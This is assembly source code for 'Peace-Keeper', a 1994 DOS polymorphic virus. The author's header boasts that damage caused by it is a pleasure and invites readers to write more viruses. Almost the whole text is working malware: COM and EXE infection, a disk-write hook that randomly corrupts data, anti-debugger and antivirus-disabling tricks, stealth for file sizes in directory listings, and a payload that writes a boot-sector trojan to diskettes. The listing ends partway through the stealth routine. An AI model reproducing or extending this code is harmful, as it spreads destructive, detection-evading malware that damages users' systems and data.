;============================================================================;
;PEACE-KEEPER VIRUS Version 2.10d - by Doctor Revenge ,18-May-1994 Italy .   ;
;                                                                            ;
;DISCLAIMER:                                                                 ;
;This code wasn't written for research purpose only;any damage,direct or     ;
;implied,caused by this source code ,or the resulting compiled file , is     ;
;an immense pleasure for the author . Modifing this code is strictly         ;
;proibithed and will be punished;instead , you can look at this code to      ;
;improve your knowledge and to write some good italian virus .               ;
;                                                                            ;
;COMPILING:                                                                  ;
;If you want to spread this program directly from the source code , you      ;
;have to use the great macroassembler and linker ,version 6 or up .          ;
;TASM is not supported and ,any other assembler will probably produce        ;
;different op-codes.Test it carefully!                                       ;
;                                                                            ;
;DESCRIPTION:                                                                ;
;You are editing the best polymorphic italian virus.It's about 4k , and      ;
;is capable to infect EXE file as well as COM files.The infection for exe    ;
;file is in the standard way,but ,for infecting com files,this program       ;
;can create a lot of indirect jump , placed everywhere in the file,in        ;
;order to fool many euristic engines.It avoids *all* interrupt 21's          ;
;monitors , using a token scan into dos's segment , grabbing the total       ;
;control of the victim system.Finally,it is very polymorphic , capable       ;
;to generate billions of different looking copies of itself ,using a         ;
;simple , but very useful, 'slow polymorphic' method .                       ;
;No other italian virus can do the same!                                     ;
;                                                                            ;
;GREETINGS:                                                                  ;
;First of all,I want to make some good greetings to the TridenT group ,      ;
;(in the person of Omega),that helped me very much in writing and spreading  ;
;this code . At the same time I want to build some nasty things against      ;
;[NuKE]: never in this lame team!                                            ;
;                                                                            ;
;COOMING SOON:                                                               ;
;The euristic engines is really a nasty problem . So , I decided to write    ;
;a polymorphic engine capable to avoid scannig as well as euristic alerts.   ;
;Keep on line to grab my next creation.                                      ;
;                                                                            ;
;Greetings to all virus writers...!!                                         ;
;============================================================================;


_CODE   SEGMENT WORD PUBLIC 'code'
        ASSUME cs:_CODE,ds:_CODE
        ORG     100h
Start:
        call    $+3
        pop     si                      ; calculating delta offset
        sub     si,03                   ; Get from stack the entry_point
        jmp     Fuck_tbx                ; Make a joke against tbclean
        nop

; Interrupt 13 handler. On a random bases it swaps the write call
; destroying random portion of the hard disk .

Int13:
        cmp     cs:Gate,Close           ; Check if the virus is infecting
        je      Jmp13                   ; a victim file
        cmp     ah,03                   ; Check if a write call is present 
        je      Roulette                ; If yes, make a joke .
Jmp13:
        jmp     DWORD PTR cs:Old13      ; Jmps to next int13 filter
        iret
Roulette:
        push    ax
        push    bx
        call    Rnd_Get                 ; Get a random number
        and     ah,00000111b            ; Setting the numbers for the play
        and     al,00000111b
        cmp     ah,07                   ; Check if it is time to die
        jMP     No_Prize
        cmp     al,06
        jne     No_Prize
Prize:                                  ; Ahahaha (nasty!),no write performed
        pop     bx                      ; Popping registers and simulate
        pop     ax                      ; a perfect int 13h operation
        clc
        iret
No_Prize:                               ; Perform the normal int13h call .
        pop     bx
        pop     ax
        jmp     Jmp13

; With this int 1 handler , the virus can stop the naughty
; action of a nasty program called Tbclean . This handler passes
; control to an hidden entry point , fucking the euristic engine .

Int1:
        cmp     cs:[Gone+si-100h],Stop  ; Is time to jump ?
        jne     no_jmp
        mov     cs:[Gone+si-100h],Now
        pushf                           ; Set off trap flag
        pop     ax
        and     ax,0feffh
        push    ax
        popf                            ; Storing new flags
        jmp     BrkDone                 ; jmp to hidden entry point
No_jmp:
        iret                            ; Return to the calling process

; Hooking int 1 (Single step) to avoid euristic cleaning .

Fuck_Tbx:
        sub     ax,ax
        mov     es,ax                   ; Hooking directly via IVT the
        cli                             ; single step tracer .
        mov     dx,WORD PTR es:[1*4]
        mov     cx,WORD PTR es:[1*4+2]  ; Saving old address
        sti
        lea     ax,WORD PTR [Int1+si-100h]
        mov     cs:[Gone+si-100h],Stop  ; Patching with our handler
        mov     WORD PTR es:[1*4],ax
        mov     WORD PTR es:[1*4+2],cs
        pushf
        pop     ax
        or      ax,0100h                ; Set trap flag on .
        push    ax
        popf                            ; After this instruction , the
        nop                             ; control passes to the virus
U_r_so_stupid:                          ; if tbclean is off...
        int     20h                     ; ... if it is on, this is the end.
BrkDone:
        cli
        mov     WORD PTR es:[1*4],dx    ; Restoring old int1 address .
        mov     WORD PTR es:[1*4+2],cx
        sti
        jmp     Begin                   ; Jmp to the virus entry point

; Random number generator stolen from the Girafe Virus

Rnd_Init:
        push    cx
        call    Rnd_Init0               ; Call a few times the random
        and     ax,000fh                ; engine ...
        inc     ax
        xchg    ax,cx
Random_Lup:
        call    Rnd_Get                 ; Warm-Up the engine
        loop    Random_Lup
        pop     cx
        ret                             ; Random init done .
Rnd_Init0:
        push    dx
        push    cx                      ; Init the random generator with
        mov     ah,02ch                 ; current data
        int     21h
        in      al,040h                 ; Get some garbage from port 040h
        mov     ah,al
        in      al,040h
        xor     ax,cx                   ; Preparing random seeds
        xor     dx,ax
        jmp     Move_Rnd                ; Patching random generator code .
Rnd_Get:
        push    dx
        push    cx
        push    bx
        mov     ax,0deadh               ; These locations will be modified
        mov     dx,0deadh               ; by the random init
        mov     cx,7
Rnd_Lup:
        shl     ax,1
        rcl     dx,1                    ; This is the main loop to
        mov     bl,al                   ; calculate random numbers
        xor     bl,dh
        jns     Rnd_l2
        inc     al
Rnd_l2:
        loop    Rnd_lup
        pop     bx
Move_Rnd:                               ; Modify instructions
        mov     WORD PTR cs:[rnd_get+4],ax
        mov     WORD PTR cs:[rnd_get+7],dx
        mov     al,dl
        pop     cx
        pop     dx
        ret

; Jumping to old infected file entry-point.For EXE files , this code
; restores the ES=PSP and jumps to the old entry address.
; For COM files , it restores the modifies code into the program and
; jump to the file's beginning.

Restore:
        cmp     BYTE PTR [Ftype+si-100h],Com ; Checking the file type
        je      JmpCom
        cmp     BYTE PTR [Ftype+si-100h],Exe
        je      JmpExe
        jmp     $
JmpExe:
        mov     ax,[StartDs+si-100h]
        mov     ds,ax
        mov     es,ax
        mov     dx,ds
        add     dx,010h
        mov     cx,dx
        add     dx,WORD PTR cs:[Progss+si-100h]
        cli
        mov     ss,dx
        mov     sp,WORD PTR cs:[Progsp+si-100h]
        sti
        add     cx,WORD PTR cs:[Progcs+si-100h]
        push    cx
        push    WORD PTR cs:[Progip+si-100h]
        retf
JmpCom:
        mov     cx,[ChaiNum+si-100h]    ; Load the numbers of the chain
        lea     si,WORD PTR [Over+si-100h]
        push    cs
        pop     es
        cld
PatchCom:
        push    cx
        lodsw                           ; Load chain length
        mov     cx,ax
        lodsw                           ; Load chain offset
        mov     di,ax
        add     di,0100h                ; Replacing chain code with
        rep     movsb                   ; the original code stored
        pop     cx                      ; at the end of the infected file
        loop    PatchCom
        push    cs
        mov     ax,100h
        push    ax
        retf
Error:
        stc                             ; Set CF and return
        ret
NoError:
        clc                             ; Clear CF and return
        ret

; Token tunnelling routine . Searchs the DOS's segment to find
; original interrupt 21h's address .

Token:
        mov     ah,034h                 ; Get InDos flag segment to locate
        int     21h                     ; DOS's code location
        push    es
        mov     ax,[DosVer+si-100h]     ; Checking dos's version to
        sub     ah,ah                   ; scan the right string
        sub     bx,bx
        mov     bx,03
        mov     cx,4
LookVer:
        cmp     al,bl
        jz      SetString               ; Scanning current DOS's version .
        inc     bl
        inc     ah
        loop    LookVer
        jmp     Error                   ; Dos version unknown
SetString:
        sub     al,al                   ; Setting dos's code parameters
        xchg    al,ah
        mov     bx,4
        mul     bx                      ; Calculating appropriate scan string
        lea     bx,[Dos3+si-100h]
        add     bx,ax
        pop     ax
        call    ScanDos                 ; Call the TokenTunnelling Engine

; Checking if the stolen scan string is the same of the
; DOS code entry point string .

Compare:
        cmp     dx,WORD PTR [bx]
        jne     NotDos                  ; Check memory and DX register
        mov     dx,WORD PTR es:[si+2]
        cmp     dx,WORD PTR [bx+2]
        jne     NotDos
        jmp     Error
NotDos:
        jmp     NoError
ScanDos:
        mov     di,si                   ; Set input register
        mov     es,ax                   ; Set input segment (DOS's code seg )
        mov     si,0100h                ; Begin scan from 0100h offset
        mov     cx,5000                 ; Scan about 5k of codes
Search:                                 ; Get two bytes from dos , check
        mov     dx,WORD PTR es:[si]     ; if the first byte is the same
        cmp     dh,BYTE PTR [bx]        ; in the scan string . If yes ,
        jne     Cont1                   ; check other tree bytes .
        call    Compare
        jc      Founded
Cont1:
        inc     si
        loop    Search                  ; Looking for ...
        jmp     Error
Founded:                                ; Storing original int21 address
        mov     WORD PTR [ODos21+di-100h],si
        mov     word ptr [ODos21+di-100h+2],es
        mov     si,di                   ; Restoring old si value
        jmp     NoError                 ; All done.No error (Eureka!)
        nop

; Real start of the virus .

Begin:
        mov     ah,030h                 ; Get Dos's Version
        int     21h
        mov     cs:[DosVer+si-100h],ax  ; Store it into buffer
        mov     cs:[StartDs+si-100h],ds ; Store,also, the start-up DS value
        push    cs
        pop     ds
        mov     bp,si                   ; Call the RU-There service ,if present
        mov     ax,0deadh               ; AX:=0DEADH --> BX:=0DEADH
        int     21h
        cmp     bx,ax
        jz      Restore                 ; If already present,restore old prog
        mov     ax,[DosVer+si-100h]     ; Check the DOS's version
        cmp     al,03
        jl      Restore                 ; I need DOSv3 or up
Chk_Vsafe:                              ; Check the presence of the
        mov     ax,0fa00h               ; CP's Vsafe monitor
        mov     dx,5945h
        int     16h                     ; Call Keyboard interrupt handler
        cmp     di,4559h                ; to deactivate this nasty and
        jne     GetAdrs                 ; sloppily written TSR monitor .
        mov     ax,0fa01h
        mov     dx,5945h
        int     16h
GetAdrs:
        mov     ax,3513h                ; Call DOS to obtain int13 address
        int     21h
        mov     WORD PTR [Old13+si-100h],bx  ; Store them
        mov     WORD PTR [Old13+si-100h+2],es
        mov     ax,3521h                ; Do the same thing with interrupt 21h
        int     21h
        mov     WORD PTR [Dos21+si-100h],bx
        mov     WORD PTR [ODos21+si-100h],bx   ; Store them into buffers
        mov     WORD PTR [Dos21+si-100h+2],es
        mov     WORD PTR [ODos21+si-100h+2],es
        call    Token

; The MCG module needs a particualr setting to work properly . This setting
; is obtained from the harddisk's serial number for dos4+ or from the
; current date for dos3.

InitMut:
        mov     ax,[DosVer+si-100h]     ; Check DOS's version for proper
        cmp     al,04                   ; polymorphic engine setting .
        jl      Init3

; For DOS4+ , the virus call dos to obtain first harddisk serial number
; calculated at every format service .

Init4:
        mov     ax,06900h               ; Get serial number of the
        mov     bl,03                   ; first harddisk
        lea     dx,[Buf+si-100h]
        int     21h
        mov     ah,BYTE PTR [Buf+si-100h+2] ; Store datas into MCG's setting
        mov     BYTE PTR [Flag+si-100h],ah
        jmp     Move_OnTop

; For DOS3 , the virus ,simply, get the current system's date .

Init3:
        mov     ah,02ah                 ; Call DOS's date/time service .
        int     21h
        mov     BYTE PTR [Flag+si-100h],dh

; Moving virus on the top of the system RAM.

Move_OnTop:
        mov     bx,[StartDs+si-100h]    ; Get the start-up data segment
        dec     bx                      ; Get the segment of the current MCB
        mov     es,bx
        sub     bx,bx
        cmp     BYTE PTR es:[bx],'Z'    ; Check if it is the last block
        jne     Restore                 ; active in central memory .
        mov     ax,(6200/16)            ; Preserving about 6k of memory space.
        sub     WORD PTR es:[bx+3],ax   ; Substracting this memory amount
        sub     WORD PTR es:[bx+12h],ax ; from dos's MCB data .
        mov     es,WORD PTR es:[bx+12h] ; Get viral segment address
        push    si
        sub     cx,cx
        sub     di,di
        or      di,0100h                ; Move virus on the top
        or      cx,VirLen               ; of the system memory .
        rep     movsb                   ; Move it!
        pop     si
HookDos:
        mov     ax,2521h
        push    ds
        push    es                      ; Hooking the dos's interrupt 21h
        pop     ds                      ; with our handler .
        lea     dx,Int21
        int     21h
        mov     ax,2513h                ; Do the same thing with int 13h
        lea     dx,Int13
        int     21h
        pop     ds
        mov     ax,0deaeh               ; Now,it's time to init the random
        int     21h                     ; number generator with an int21 call.
        jmp     Restore

; This procedure is the crazy payload of the virus . It is called
; every 16 infections, and it overwrites the boot-sector of the disk into
; drive a: , with a killer-trojan.

MyBoot:
        nop
        call    Rnd_Get
        and     ah,00000111b            ; Get a random number . The infection
        and     al,00000011b            ; of the boot-sector of the disk a:
        cmp     ah,7                    ; is performed about 1 on 16 times
        jne     NoError
        cmp     al,4
        jne     NoError
        cld                             ; Set direction flag .
        lea     bx,Over                 ; Set output buffer for Boot-Sector
        mov     al,0
        mov     cx,1                    ; Read the boot-sector into the buffer
        sub     dx,dx
        int     25h                     ; Call DOS's disk read service .
        popf
        jc      Error                   ; If error , skip infection
Get_Ofs:
        mov     si,bx
        cmp     BYTE PTR [si],0ebh      ; Find the boot-sector's code
        jne     Error                   ; entry point , in order to not
        push    cs                      ; overwrite important DPB data
        pop     es
        lodsb
        lodsb                           ; Get offset of the BSR-code entry
        sub     ah,ah
        add     si,ax
        mov     di,si
        lea     si,Killer               ; Set starting address of the routine
        mov     cx,(OFFSET Here - OFFSET Killer)
        rep     movsb                   ; Moving killer routine into boot code
Write_BSR:
        sub     dx,dx                   ; Write the new Boot-Sector on the
        mov     cx,1                    ; diskette , using dos's write service.
        xor     al,al
        lea     bx,Over                 ; Updating boot-sector .
        int     26h
        popf
        jc      Error
        jmp     NoError

; This is the Boot-Killer Trojan , written into the boot-sector .

Killer:
        call    $+3                     ; Get delta offset .
        pop     bx
        sub     bx,3
        cli                             ; Clear interrupts and set
        cld                             ; direction falg .
        xor     ax,ax                   ; Set stack (Absolutely unnecessary!)
        mov     ss,ax
        mov     ds,ax
        mov     sp,07c00h               ; Set new stack pointer .
        sti
Put_Msg:
        mov     ax,0b800h               ; Put the message into video memory
        mov     es,ax
        sub     di,di
        mov     ax,1f20h                ; Clear the screen .
        mov     cx,(80*25)
        stosw
        loop    $-1
        sub     di,di                   ; Put the first string into video buf
        mov     si,bx
        add     si,(OFFSET Firm1 - OFFSET Killer)
        mov     cx,LENGTHOF Firm1
PutFirm1:
        lodsb
        stosb
        inc     di
        loop    PutFirm1
        mov     cx,LENGTHOF Firm2
        mov     di,(80*2)
PutFirm2:
        lodsb
        stosb
        inc     di
        loop    PutFirm2
        jmp     $

Firm1   BYTE    'Peace-Keeper Virus V2.10 '
Firm2   BYTE    'Written by Doctor Revenge 18-May-1994 , Italy'
Here:

; Checking the file for name . This procedure determines the file type
; and provide to skip unwanted infections of some popular av programs.

CheckFile:
        mov     si,FOfs                 ; Get into SI the file pointer
        push    FSeg                    ; Store into DS the file segment
        pop     ds
        push    cs
        pop     es
        mov     di,VirLen+100h          ; Set output pointer
        mov     cx,0080h                ; Load 80 bytes from filename.
NameMove:
        lodsb
        cmp     al,0                    ; Converts to uppercase
        je      Moved                   ; and moves the filename into
        cmp     al,'a'                  ; internal buffer
        jb      CharOK
        cmp     al,'z'
        ja      CharOK
        xor     al,20h
CharOk: stosb
        loop    NameMove
Moved:
        stosb                           ; Make the ASCIIZ termination .
        mov     si,di
        dec     si
        std                             ; Set reverse direction and scan
        push    cs                      ; for the file's extension .
        push    cs                      ;
        pop     es                      ; Adjusting segment registers.
        pop     ds
Scan2:
        lodsb                           ; Scans for the extension begin
        cmp     al,'.'
        jne     Scan2
        cld                             ; Set directin flag .
        inc     si                      ; Checks the extension
        inc     si                      ; of the victim file
        mov     ax,si                   ;
        lea     di,Ext                  ; Load extension settings
        mov     cx,03
        repe    cmpsb                   ; Comapare these extensions
        jnz     scan3                   ;
        mov     FType,Exe               ; If it is 'EXE' we have an exe file
        jmp     Scan4
Scan3:
        lea     di,Ext+3
        mov     si,ax
        mov     cx,03                   ; Scans for 'EXE' or 'COM'
        repe    cmpsb                   ; files
        jnz     Error
        mov     FType,Com
Scan4:
        std
        mov     cx,15
FindBeg:
        lodsb
        cmp     al,':'
        je      CheckAV                 ; Scans to find the begin
        cmp     al,'\'                  ; of the filename
        je      CheckAV
        loop    FindBeg
        jmp     Error
CheckAV:
        inc     si
        inc     si                      ; Checks first two bytes of
        cld                             ; the file name , to avoid
        lodsw                           ; infection of some av progs
        lea     di,Skip
        mov     cx,10
        repne   scasw
        jz      error
        jmp     NoError

; Procedures commonly used to infect the victim file .

OpenFile:
        push    ds
        mov     dx,FOfs
        mov     ds,FSeg                 ; Open the victim file using
        mov     ax,3d02h                ; the original dos's interrupt 21h
        call    Dos
        pop     ds
        jc      Error
        mov     Handle,ax
        jmp     NoError
CloseFile:                              ; Do you need any comments here?
        mov     ah,03eh                 ; If yes, fill it !
        mov     bx,handle               ; I won't spend time to add comments
        call    dos                     ; to these virus-standard routines .
        jmp     NoError
SetAttrib:
        push    ds
        mov     dx,FOfs                 ; Load the file's attributes and stores
        mov     ds,FSeg                 ; them into internal buffers.
        mov     ax,4300h
        call    Dos
        mov     cs:FAttrb,cx
        xor     cx,cx
        mov     ax,4301h
        call    Dos
        pop     ds
        jc      Error
        jmp     NoError
StoreDate:
        mov     ax,5700h
        mov     bx,Handle
        call    Dos
        mov     FDate,dx
        mov     FTime,cx
        jmp     NoError
LoadDate:
        mov     ax,5701h
        mov     bx,Handle
        mov     cx,FTime
        mov     dx,FDate
        cmp     Fucked,Yes
        jnz     No_Tag
        or      cl,01fh
        and     cl,0feh
No_Tag:
        call    Dos
        jmp     NoError

; This is the handler of the viral interrupt 24h (Critical Error Section ).
; During infection it is hooked to avoid 'Abort,Retry,Fail...' on a
; write-protected disk.

SetInt24:
        push    es
        sub     ax,ax
        mov     es,ax
        mov     ax,WORD PTR es:[24h*4]
        mov     WORD PTR es:[24h*4],OFFSET Fake24
        mov     WORD PTR Old24[00],ax
        mov     ax,WORD PTR es:[24h*4+2]
        mov     WORD PTR es:[24h*4+2],cs
        mov     WORD PTR Old24[02],ax
        pop     es
        jmp     NoError
LoadInt24:
        push    es
        sub     bx,bx
        push    bx
        pop     es
        mov     ax,WORD PTR Old24[00]
        mov     WORD PTR es:[24h*4],ax
        mov     ax,WORD PTR Old24[02]
        mov     WORD PTR es:[24h*4+2],ax
        pop     es
        jmp     NoError

; Moving anywhere the file's pointer .

MoveFP:
        push    cx
        push    bx
        mov     ah,042h
        sub     cx,cx
        mov     dx,cx
        mov     bx,Handle
        call    Dos
        pop     bx
        pop     cx
        jmp     NoError

; Loading and adjusting the exe header , in order to run the virus first.

CalcLen:
        mov     cx,200h
        div     cx                      ; Calculate file page length
        or      dx,dx
        jz      NoCor
        inc     ax
NoCor:  ret                             ; No correction needed.
GetLen:
        mov     ax,Size1                ; Put into AX:DX pair the file size
        mov     dx,Size2
        ret
EntryExe:
        mov     Fucked,Nope
        mov     al,00                   ; Set file's pointer to the begin
        call    MoveFP                  ;
        mov     ah,03fh                 ; Read about 1ch bytes from the file
        mov     bx,Handle
        mov     cx,01ch
        lea     dx,Buf                  ; Set working buffer
        call    Dos
        lea     si,Buf
        cmp     WORD PTR [si],'ZM'      ; Check if it is an EXE file
        jne     Error
        cmp     WORD PTR [si+12h],0deadh; Is it already infected?
        jz      Error
        cmp     WORD PTR [si+18h],040h  ; Check if it is a Windows/OS2 file
        jb      Not_Win
Chk4Win:
        sub     cx,cx
        mov     dx,003ch                ; Set new file's pointer position
        mov     ax,4200h
        mov     bx,Handle
        call    Dos
        jc      Error
        mov     ah,03fh                 ; Read 4 bytes from the new position
        mov     cx,04                   ; and store them into the microbuffer
        lea     dx,MiniBuf
        call    Dos
        jc      Error                   ; If we are in presence of a New-EXE
        mov     dx,WORD PTR MiniBuf[00] ; haeder , we are storing the offset
        mov     cx,WORD PTR MiniBuf[02] ; of it into a buffer .
        mov     ax,4200h                ;
        mov     bx,Handle               ; Moving file pointer to this new
        call    Dos                     ; position in the EXE file .
        jc      Error
        mov     ah,03fh
        mov     cx,4                    ; Read the first 4-bytes
        lea     dx,MiniBuf              ;
        call    Dos                     ; Checking if the target file is
        jc      Error                   ; Windows/OS-2 file .
        cmp     BYTE PTR MiniBuf[01],'E'
        jz      Error                   ; If Windows/OS2 file, skip infection
Not_Win:
        call    GetLen                  ; Performing a simple check on the
        call    CalcLen                 ; file's header information .
        cmp     WORD PTR [si+4],ax      ;
        jnz     Error                   ; Check for the correct file length
        cmp     WORD PTR [si+2],dx
        jnz     Error
        cmp     WORD PTR [si+0ch],0
        jz      Error
        cmp     WORD PTR [si+1ah],0     ; Internal overlays not zero ...
        jnz     Error
CalcEntry:
        call    GetLen
        mov     bx,0010h
        div     bx                      ; Calculating new CS:IP pair
        mov     TrashB,dx               ; Remainder is the virus entry point
        sub     ax,WORD PTR [si+8]      ;
        push    WORD PTR [si+16h]       ; Storing old values and patching
        pop     ProgCS                  ; EXE header with viral entry-point .
        mov     WORD PTR [si+16h],ax
        push    WORD PTR [si+0eh]
        pop     ProgSS
        mov     WORD PTR [si+0eh],ax
        push    WORD PTR [si+14h]
        pop     ProgIP
        mov     WORD PTR [si+14h],dx
        push    WORD PTR [si+10h]
        pop     ProgSP
        mov     WORD PTR [si+10h],2000h  ; Set new Stack

; Creating EXE decryption routine , calling the MCG engine .

Create_Entry:
        call    Rnd_Get                 ; Get a random number
        mov     bl,Flag                 ; Set decryption algorithm
        mov     di,VirLen+100h          ; Set decryption output offset
        mov     bp,TrashB               ; Store entry-point .
        push    si
        call    Crypt                   ; Call the Engine .
        pop     si
Patch_Length:
        call    GetLen                  ; Calculating new file's size
        add     ax,VirLen
        adc     dx,0
        add     ax,DecLen
        adc     dx,0
        call    CalcLen                 ; New size in 512bytes page format .
        mov     WORD PTR [si+4],ax      ; Update file length information
        mov     WORD PTR [si+2],dx
MemAlloc:
        cmp     WORD PTR [si+0ch],0ffffh ; Extremely dangerous code !
        jne     NotHigh                  ; It don't work with negative
        mov     WORD PTR [si+0ch],0ffffh ; entry point .
NotHigh:
        mov     WORD PTR [si+12h],0deadh ; Put 'already infected' flag .
PatchEntry:
        mov     al,00
        call    MoveFP
        mov     ah,040h
        mov     bx,Handle                ; Updating EXE 's header
        mov     cx,01ch
        lea     dx,Buf
        call    Dos
        mov     Fucked,Yes              ; Set infected flag .
        jmp     NoError

; This procedure creates the polymorphic chains for the com files .
; Actually , it is full of bugs ,but works well! (Murphy rules...)

EntryCom:
        mov     Gflag,Yes
        mov     ax,3000                  ; Check the file's size
        cmp     ax,Size1
        jnb     Error
        mov     al,00
        call    MoveFP
        sub     ax,ax
        mov     LstOfs,ax
        mov     BufLen,ax                ; Resetting work values
        mov     CurOfs,ax
        mov     BufOfs,VirLen+200h
        call    Rnd_Get
        sub     ah,ah
        and     al,00000011b             ; How many elements in the chain ?
        inc     al
        inc     al
        mov     ChaiNum,ax
        mov     cx,ax
Chain1:
        push    cx
        call    Rnd_Get
        sub     ah,ah
        and     al,00000111b             ; Filling the element with a lot
        inc     al                       ; of non-sense instructions .
        mov     cx,ax
        mov     di,VirLen+100h
Chain2:
        call    Rnd_Chain
        dec     cx                       ; Call the MCG Engine
        jnz     Chain2
        mov     al,0e9h
        stosb                            ; Put the jump's opcode
CalcNxt:                                 ;
        push    di                       ;
        mov     bx,VirLen+100h           ; Now, it's time to get the
        sub     di,bx                    ; element length .
        inc     di                       ;
        inc     di                       ;
        add     CurOfs,di                ; Updating current offset with it
        mov     Elen,di                  ; Storing element length
        pop     di
        pop     cx
        cmp     cx,01                    ; Is it the last element of the chain?
        push    cx
        jz      LastJmp
CalcOfs:
        call    Rnd_Get                  ; Set the new offset for the next
        xor     ah,ah                    ; chain's element .
        and     al,00111111b             ;
        mov     bx,20h                   ; I will change this part , with a
        mul     ax                       ; more sophisticated calculation ,
        mov     dx,CurOfs                ; based on the file length  .
        add     dx,ax
        cmp     dx,Size1
        ja      CalcOfs                  ; Is the new offset too big ?
        stosw                            ; If yes,repeat calculation ...
        add     CurOfs,ax                ;
        jmp     PutJmp                   ; Up-dating current offset
LastJmp:
        mov     ax,Size1
        sub     ax,CurOfs                ; Setting jump for the virus
        stosw
PutJmp:
        call    Put_Chain
        pop     cx                       ; Write the element on the file
        loop    Chain1                   ; Performing the loop ....
Make_Decrypt:
        call    Rnd_Get                  ; Get a random number
        mov     bl,Flag                  ; Set decrypotion algo
        mov     di,VirLen+100h
        mov     bp,Size1
        add     bp,0100h
        push    si
        call    Crypt                    ; Call the polymorphic engine .
        pop     si
        jmp     NoError
Put_Chain:
        mov     ah,03fh                  ; Read old victim's file bytes
        mov     cx,Elen
        mov     si,BufOfs
        push    Elen
        pop     WORD PTR [si]            ; Prepare buffer for saving them
        push    LstOfs                   ; Buf:
        pop     WORD PTR [si+2]          ;     LENGTH,OFFSET,..bytes....
        mov     dx,BufOfs                ;     ^----^ ^----^
        add     dx,4                     ;      word   word
        mov     bx,Handle
        call    Dos
        add     BufOfs,ax
        add     BufOfs,4
        add     BufLen,ax
        add     BufLen,4
        mov     ax,4200h                 ; Moving file pointer to old location
        sub     cx,cx
        mov     dx,LstOfs
        call    Dos
        mov     ah,040h
        mov     cx,Elen                  ; Writing element into the file .
        mov     dx,VirLen+100h
        mov     bx,Handle
        call    Dos
        mov     ax,4200h                 ; Moving file's pointer to the
        xor     cx,cx                    ; the next offset to process
        mov     dx,CurOfs
        mov     bx,Handle
        call    Dos
        mov     LstOfs,ax                ; Saving last offset
        jmp     NoError
WriteBuf:
        mov     ah,040h
        mov     bx,Handle                ; Writing old bytes buffer at the
        mov     cx,BufLen                ; end of the infected files .
        add     cx,2
        mov     si,VirLen+200h
        add     si,BufLen
        mov     WORD PTR [si],0deadh     ; Setting the already infected flag
        mov     dx,VirLen+200h
        call    Dos
        jmp     NoError
CheckTag:
        mov     ax,4200h
        sub     cx,cx
        mov     dx,Size1
        sub     dx,2                     ; Loading the last two bytes of the
        mov     bx,Handle                ; files to check the flag ...
        call    Dos
        mov     ah,3fh
        mov     cx,2
        lea     dx,Buf
        call    Dos
        cmp     WORD PTR buf[00],0deadh  ; is it already infected ?
        jne     NoError
        jmp     Error

; This procedure is called at every infection to create the polymorphic
; version of the virus and to write this code at the end of the victim .
; With the paged writing of the virus into the victim file , this virus
; can preserve a large amount of memory,keeping only 6k of central memory .
; Look at other , memory pig , polymorphic viruses !

WriteVirus:
        mov     al,02                   ; Move file pointer to the end .
        call    MoveFP                  ;
        mov     dx,VirLen+100h          ; First of all,we have to write
        mov     cx,DecLen               ; the polymorphic decryption routine .
        mov     ah,040h
        mov     bx,Handle
        call    Dos                     ; Write it into file .
Set_Encr:
        cmp     FType,Exe
        jz      Write_Exe               ; Check the file type
        cmp     FType,Com
        jz      Write_Com
        jmp     $                       ; Absolutely stupid!
Write_Exe:
        call    Calc_Page               ; Calculating the paged length
        push    dx                      ; of the file .
        mov     cx,ax
        mov     si,0100h                ; Set input offset
Exe_Encr_Lup:
        push    cx
        mov     dx,Key                  ; Get encryption key
        mov     cx,200h                 ; Crypt exactly 512 bytes of code
        mov     di,VirLen+100h          ; Address of the output buffer
        call    Crypt_Code              ; Crypt the code ...
        mov     ah,040h                 ;
        mov     bx,Handle               ; ... and write it into the file .
        call    Dos
        pop     cx
        loop    Exe_Encr_Lup            ; Crypt all the virus body .
        pop     cx
        mov     di,VirLen+100h          ; Encrypts the remainder virus code
        mov     dx,Key
        call    Crypt_Code
        mov     ah,040h                 ; Write it at the end of the file .
        mov     bx,Handle
        call    Dos
        jmp     NoError
Write_Com:
        call    Calc_Page
        push    dx                      ; Same as above...!
        mov     cx,ax
        mov     si,0100h
Com_Encr_Lup:
        push    cx
        mov     dx,Key
        mov     cx,200h
        mov     di,VirLen+200h
        add     di,BufLen
        call    Crypt_Code
        mov     ah,040h
        mov     bx,Handle
        call    Dos
        pop     cx
        loop    Com_Encr_Lup
        pop     cx
        mov     di,VirLen+200h
        add     di,BufLen
        mov     dx,Key
        call    Crypt_Code
        mov     ah,040h
        mov     bx,Handle
        call    Dos
        jmp     NoError
Calc_Page:
        sub     dx,dx
        mov     bx,200h
        mov     ax,VirLen
        div     bx
        ret                              
        
; Simulating a complete push of the process registers

PushAll:
        mov     cs:ProcAX,ax            ; Saving all registers into
        mov     cs:ProcBX,bx            ; internal buffers .
        mov     cs:ProcCX,cx
        mov     cs:ProcDX,dx
        mov     cs:ProcSI,si
        mov     cs:ProcDI,di
        mov     cs:ProcBP,bp
        mov     cs:ProcDS,ds
        mov     cs:ProcES,es
        nop
        ret

; Re-popping the process registers

PopAll:
        mov     ax,cs:ProcAX            ; Re-popping the registers from
        mov     bx,cs:ProcBX            ; the buffer .
        mov     cx,cs:ProcCX
        mov     dx,cs:ProcDX
        mov     si,cs:ProcSI
        mov     di,cs:ProcDI
        mov     bp,cs:ProcBP
        mov     ds,cs:ProcDS
        mov     es,cs:ProcES
        nop
        ret

; Fake int 24 handler .

Fake24:
        mov     al,03
        iret

; Handler for the int21 .

Int21:
        cmp     ax,0deadh
        jne     ChkFunction
        mov     bx,ax
        iret
ChkFunction:
        cmp     ax,0deaeh
        je      Rnd_Call
        cmp     ax,4b00h                ; EXECution ?
        je      Exec
        cmp     ah,011h                 ; DIR command ?
        je      Hide_Dir
        cmp     ah,012h
        je      Hide_Dir

; Passing control to the next int21 hooker .

JmpDos:
        jmp     DWORD PTR cs:dos21
        iret

; Call directly the int21 ,using original address .

Dos:
        pushf
        call    DWORD PTR cs:odos21
        ret

Rnd_Call:
        call    PushAll
        call    Rnd_Init
        call    PopAll
Exec:
        call    PushAll                 ; Saving registers
        mov     cs:FOfs,dx
        mov     cs:FSeg,ds              ; Saving filename's pointer
        push    cs
        pop     ds
        call    SetInt24

        call    Infect                  ; Call infect procedure .

        call    LoadInt24
        call    PopAll
        jmp     JmpDos                  ; Work is done .

; Stealth on the file's length . At every dir command issued
; by the command interpreter , it checks for the infected flag on
; the seconf field . If it is infected , this code substracts the
; virus length from the file length .

Hide_Dir:
        pushf
        call    Dos                     ; Perform original task to get
        popf                            ; an opened FCB for stealth
        test    al,al
        jnz     Hide_Error
        push    ax
        push    bx
        push    dx
        push    si
        push    es
        push    ds
        mov     ah,051h
        call    Dos                     ; Check if it is the COMMAND.COM
        mov     es,bx
        cmp     bx,WORD PTR es:[0016h]
        jnz     Hide_Error2
        mov     si,dx
        mov     ah,02fh
        call    Dos
        lodsb
